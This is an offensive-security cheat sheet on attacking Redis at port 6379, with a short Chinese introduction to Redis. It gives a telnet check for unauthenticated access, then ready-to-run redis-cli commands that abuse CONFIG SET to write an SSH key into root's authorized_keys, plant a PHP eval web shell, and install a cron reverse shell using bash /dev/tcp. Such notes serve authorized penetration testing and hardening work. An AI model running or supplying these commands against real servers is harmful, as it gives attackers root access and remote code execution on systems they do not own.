# 6379 - Redis

<details>

<summary>Introduction</summary>

Redis 是一个开源的内存键值存储数据库，也被称为数据结构服务器。它支持多种数据结构，如字符串、哈希表、列表、集合和有序集合等，提供了丰富的操作命令来操作这些数据结构。Redis 的特点包括高性能、持久化、复制、集群和支持丰富的数据类型等。由于其快速的读写速度和丰富的功能，Redis 被广泛应用于缓存、会话存储、消息队列、排行榜和实时统计等场景中。它也被用作分布式锁和发布/订阅系统的解决方案。

</details>

<table><thead><tr><th width="178">Name</th><th>Redis</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>6379</td></tr><tr><td><strong>RCE</strong></td><td>Feasible</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>Unauthorized Access</li><li>File Write (GetShell)</li></ul></td></tr></tbody></table>

## Unauthorized Access

{% code title="Environment" %}
```bash
HOST=; PORT=6379; # TARGET HOST INFO
```
{% endcode %}

{% code title="Validation" %}
```
1) telnet $HOST $PORT
2) Enter "INFO"
```
{% endcode %}

If the target host returns Redis-related information, it indicates that unauthorized access is allowed.

## Write File

{% hint style="info" %}
Writing files may affect the server normal operation. Prioritize writing the SSH public key.
{% endhint %}

{% code title="Environment" %}
```bash
HOST=; PORT=6379; # TARGET HOST INFO
```
{% endcode %}

```bash
# (1) SSH public key

ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/id_rsa.pub
cat /tmp/id_rsa.pub | redis-cli -h $HOST -p $PORT -x set crackit
rm /tmp/id_rsa.pub

redis-cli -h $HOST -p $PORT

# In redis CLI
CONFIG SET DIR /root/.ssh/
CONFIG SET DBFILENAME "authorized_keys"
SAVE

ssh -i ~/.ssh/id_rsa root@HOST
redis-cli -h $HOST -p $PORT

# (2) WebShell
CONFIG SET DIR /var/www/html
CONFIG SET DBFILENAME exec.php
SET crackit "\n\n\n\n<?php @eval($_REQUEST['exec']);?>\n\n\n\n"
SAVE

# (3) crontab
CONFIG SET DIR /etc/cron.d
CONFIG SET DBFILENAME reverse_shell
SET crackit "\n\n\n\n* * * * * root bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
SAVE
```

## Graphical Tool

[Another Redis Desktop Manager](https://goanother.com/cn/)

